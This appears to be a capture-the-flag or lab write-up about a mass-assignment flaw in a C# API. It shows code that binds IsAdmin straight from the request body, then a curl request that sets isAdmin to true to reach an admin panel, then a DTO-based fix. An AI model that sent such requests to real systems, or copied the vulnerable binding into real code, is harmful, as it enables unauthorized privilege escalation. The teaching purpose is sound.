# 5 — Mass assignment / over-posting

**The vuln:** the profile update binds the whole request body onto the `User` entity — which
has an `IsAdmin` property the UI never shows:
```csharp
app.MapPut("/api/profile", (User update, ...) => { u.IsAdmin = update.IsAdmin; ... });
```

**The exploit:** send a field the form doesn't offer.
```bash
curl -X PUT http://<host>:5005/api/profile -H "Authorization: Bearer <tok>" \
  -H "Content-Type: application/json" -d '{"displayName":"Alex","email":"user1@corp.local","isAdmin":true}'
# then GET /api/admin/panel → the flag
```

**The fix:** bind to a DTO with only the fields a user may change, and map explicitly.
```csharp
public record UpdateProfileDto(string DisplayName, string Email);   // no IsAdmin
u.DisplayName = dto.DisplayName; u.Email = dto.Email;               // IsAdmin never touched
```

**The lesson:** never bind request bodies straight onto entities. Whitelist editable fields.
